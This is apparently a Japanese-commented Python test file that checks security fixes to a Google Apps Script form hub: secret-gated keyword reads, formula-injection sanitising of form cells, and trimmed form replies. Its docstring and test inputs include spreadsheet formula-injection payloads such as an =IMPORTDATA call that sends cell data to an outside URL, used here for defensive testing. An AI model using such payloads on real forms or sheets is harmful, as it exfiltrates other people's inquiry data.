# -*- coding: utf-8 -*-
"""2026-10-10 運用者「顧客情報の流出だけは避けたいし、問い合わせ先の情報も守りたい」から点検して見つけたもの。

1. 管制塔の受け口（Apps Script）の URL は、各サイトのフォームの送り先としてページに載っている（補助金・コーポレート）。
   その URL に ?action=all_kw と付けるだけで、合言葉なしに全社（お客様の分も）の狙う語 1,611 件と状態・URL が読めた。
   お客様の狙う語は非公開のリポジトリへ移したのに、ここから読めていた
2. フォームの値をそのままシートの1行に置いていた。「=」で始まる値は数式として入るので、誰でも送れるフォームから
   =IMPORTDATA("…"&A2) のような式を入れると、台帳を開いた時に他の問い合わせの中身を外へ送らせることができた
3. フォームの返事に、社内の見立て（温度）と台帳の行番号（＝問い合わせの総数）を返していた
"""
import json
import shutil
import subprocess
import sys
import tempfile
from pathlib import Path
from unittest import mock

from test_gates import check, ROOT

sys.path.insert(0, str(ROOT / "scripts"))
GAS = ROOT / "automation" / "gas"

HARNESS = r"""
const vm = require('vm'), fs = require('fs');
const out = (o) => ({ setMimeType: () => JSON.parse(o) });
const ctx = { ContentService: { createTextOutput: out, MimeType: { JSON: 'json' } },
  SpreadsheetApp: { openById: () => { throw new Error('シートは使わない'); }, getActiveSpreadsheet: () => { throw new Error('シートは使わない'); } },
  PropertiesService: { getScriptProperties: () => ({ getProperty: () => '' }) }, console };
vm.createContext(ctx);
for (const f of process.argv.slice(2)) vm.runInContext(fs.readFileSync(f, 'utf8'), ctx, { filename: f });
const get = (p) => ctx.doGet({ parameter: p });
const r = {
  no_secret: ['next_kw', 'all_kw', 'kw_status', 'kw_overlaps'].map((a) => get({ action: a }).error),
  wrong_secret: get({ action: 'all_kw', secret: 'ちがう' }).error,
  with_secret: get({ action: 'all_kw', secret: vm.runInContext('SHARED_SECRET', ctx) }).error,
  health: get({}).ok,
  bench: get({ action: 'scan_bench' }).error,
  cells: vm.runInContext('cells_', ctx)(['=IMPORTDATA("https://x/?"&A2)', '+81 90', '-1', '@SUM(A1)', '\t=1', 'ふつうの文', 3, '']),
};
// 問い合わせ1件を受付から台帳の1行まで通す（シートの代わりの入れ物に書く。通知・自動返信は silent で止める）
const rows = [];
ctx.sheet_ = () => ({ getLastRow: () => 1, appendRow: (row) => rows.push(row) });
ctx.siteLabel_ = (s) => s;   // サイトの表示名はシートの「サイト一覧」から引くため、ここでは id のまま
r.form = ctx.form_({ site: 'ai-lab', silent: true, data: { type: 'contact', company: '+81 株式会社', name: '=HYPERLINK("x")',
  email: 'a@example.co.jp', message: '=IMPORTDATA("https://x/?"&A2)', referer: '@x' } });
r.row = rows[0] || [];
console.log(JSON.stringify(r));
"""


def test_hub_keyword_reads_need_the_secret_and_form_cells_are_text():
    print("\n■ 守秘義務: 受け口の狙う語の読み出しは合言葉が要り、フォームの値は数式としてシートに入らない")
    node = shutil.which("node")
    if not node:
        print("  WARN  node が無いため Apps Script の動きは確かめられません（Node.js を入れると確かめる）")
    else:
        with tempfile.TemporaryDirectory() as d:
            h = Path(d) / "h.js"
            h.write_text(HARNESS, encoding="utf-8")
            p = subprocess.run([node, str(h), str(GAS / "hub.gs"), str(GAS / "contact.hub.gs")], capture_output=True,
                               text=True, encoding="utf-8", errors="replace", timeout=60)
        if p.returncode:
            raise RuntimeError(f"Apps Script を読めませんでした: {(p.stderr or p.stdout)[-300:]}")
        r = json.loads(p.stdout)
        check("合言葉なしの読み出し（next_kw・all_kw・kw_status・kw_overlaps）は断る", r["no_secret"], ["unauthorized"] * 4)
        check("違う合言葉も断る", r["wrong_secret"], "unauthorized")
        check("合言葉が合えば断らない（その先でシートを読みに行く）", r["with_secret"] != "unauthorized", True)
        check("稼働の確かめ（action なし）と同業平均（集計値だけ）は合言葉なしで答える", (r["health"], r["bench"] != "unauthorized"),
              (True, True))
        check("= + - @ タブで始まる値は先頭に ' を付けて文字として置く。ほかは触らない", r["cells"],
              ["'=IMPORTDATA(\"https://x/?\"&A2)", "'+81 90", "'-1", "'@SUM(A1)", "'\t=1", "ふつうの文", 3, ""])
        row = r["row"]
        check("問い合わせ1件が受け付けられ、返事は ok だけ", r["form"], {"ok": True})
        check("台帳の1行では、会社名・名前・本文・参照元の式が文字として置かれる",
              [c for c in row if isinstance(c, str) and c[:1] and c[:1] in "=+-@"], [])
        check("台帳の1行に入力がそろっている（消毒で中身を落とさない）",
              ["'+81 株式会社" in row, "'=HYPERLINK(\"x\")" in row, "a@example.co.jp" in row,
               "'=IMPORTDATA(\"https://x/?\"&A2)" in row], [True, True, True, True])

    src = (GAS / "contact.hub.gs").read_text(encoding="utf-8")
    check("フォームから来る行（問い合わせ・疎通確認・配信停止・再送信の追記）は全部消毒してから置く",
          (src.count("appendRow(cells_(["), "setValue(cells_([" in src), (3, True))
    form = src.split("function form_(")[1].split("\nfunction ")[0]
    check("フォームの返事に温度と台帳の行番号を返さない", ("temperature:" in form, "row: row" in form), (False, False))

    import hub_client as HC
    seen = []

    class R:
        def __enter__(self):
            return self

        def __exit__(self, *a):
            return False

        def read(self):
            return b'{"ok": true}'

    with mock.patch.object(HC, "_direct", return_value=None), mock.patch.object(HC, "HUB_URL", "https://example.invalid/exec"), \
            mock.patch.object(HC, "HUB_SECRET", "s3cret"), \
            mock.patch.object(HC, "_open", side_effect=lambda req: seen.append(req.full_url) or R()):
        HC._get({"action": "all_kw"})
    check("管制塔へ読みに行くときは合言葉を付ける", "secret=s3cret" in (seen[0] if seen else ""), True)
